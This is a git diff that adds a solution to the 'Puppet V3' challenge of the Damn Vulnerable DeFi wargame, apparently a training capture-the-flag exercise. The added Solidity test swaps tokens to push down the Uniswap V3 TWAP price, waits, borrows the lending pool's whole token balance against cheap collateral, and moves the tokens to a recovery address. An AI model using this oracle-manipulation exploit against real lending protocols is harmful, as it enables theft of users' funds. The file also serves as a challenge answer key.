@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
 import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
@@ -22,6 +23,7 @@ contract PuppetV3Challenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
     uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
     uint24 constant FEE = 3000;
+    ISwapRouter constant swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
 
     IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
     INonfungiblePositionManager positionManager =
@@ -119,7 +121,27 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        token.approve(address(swapRouter), type(uint256).max);
+        swapRouter.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: player,
+                deadline: block.timestamp,
+                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        weth.deposit{value: player.balance}();
+        skip(114);
+
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
